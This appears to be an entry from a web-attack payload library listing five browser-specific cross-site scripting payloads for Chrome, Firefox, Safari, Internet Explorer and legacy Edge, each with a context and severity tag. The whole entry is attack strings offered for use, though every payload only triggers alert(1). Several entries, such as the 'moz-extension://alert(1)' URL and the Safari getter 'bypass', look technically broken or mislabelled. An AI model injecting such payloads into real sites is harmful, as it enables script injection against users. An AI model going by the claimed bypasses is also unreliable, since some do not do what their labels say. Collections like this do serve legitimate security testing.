---
id: "xss-browser_specific-payloads"
title: "XSS Payloads - Browser-Specific Payloads"
type: "payload"
category: "web-application"
subcategory: "xss"
tags: ["xss", "browser_specific", "payload"]
difficulty: "intermediate"
platforms: ["linux", "macos", "windows"]
related: ["xss-techniques"]
updated: "2026-03-30"
---

## Overview

Payloads that target specific browser vulnerabilities or features

## Payloads

### Chrome Extension Bypass

Bypass Chrome extension content security

- **Contexts**: script
- **Severity**: medium

```html
chrome.runtime.sendMessage('', {}, alert)
```

### Firefox moz-extension

Firefox extension protocol abuse

- **Contexts**: url
- **Severity**: medium

```html
moz-extension://alert(1)
```

### Safari WebKit Bypass

WebKit specific payload for Safari

- **Contexts**: script
- **Severity**: medium

```html
Object.defineProperty(window,'alert',{get:function(){return alert}}); alert(1)
```

### Internet Explorer VBScript

VBScript execution in Internet Explorer

- **Contexts**: html
- **Severity**: high

```html
<script language="vbscript">alert(1)</script>
```

### Edge Legacy Bypass

Legacy Edge specific vulnerability

- **Contexts**: script
- **Severity**: low

```html
window.external.AddFavorite('javascript:alert(1)','XSS')
```
